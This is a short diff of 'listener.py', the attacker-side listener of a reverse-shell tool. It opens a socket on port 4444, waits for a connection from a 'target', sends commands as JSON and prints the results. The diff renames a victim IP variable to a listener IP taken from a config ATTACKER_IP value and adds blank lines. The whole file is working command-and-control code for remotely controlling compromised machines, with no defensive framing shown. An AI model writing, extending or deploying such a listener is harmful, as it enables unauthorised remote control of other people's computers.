@@ -1,7 +1,7 @@
 # listener.py
 import socket, json, base64, config
 
-victim_ip = config.VICTIM_IP
+listener_ip = config.ATTACKER_IP
 
 def server(ip, port):
     global target
@@ -12,9 +12,11 @@ def server(ip, port):
     print('[+] Listening...')
     target, address = listener.accept()
     print(f'[+] Got connection from {address}')
+    
 def send(data):
     json_data = json.dumps(data)
     target.send(json_data.encode('utf-8'))
+    
 def recieve():
     json_data = ''
     while True:
@@ -43,5 +45,5 @@ def run():
             result = recieve().encode('utf-8')
             print(result.decode('utf-8'))
             
-server(victim_ip, 4444)
+server(listener_ip, 4444)
 run()
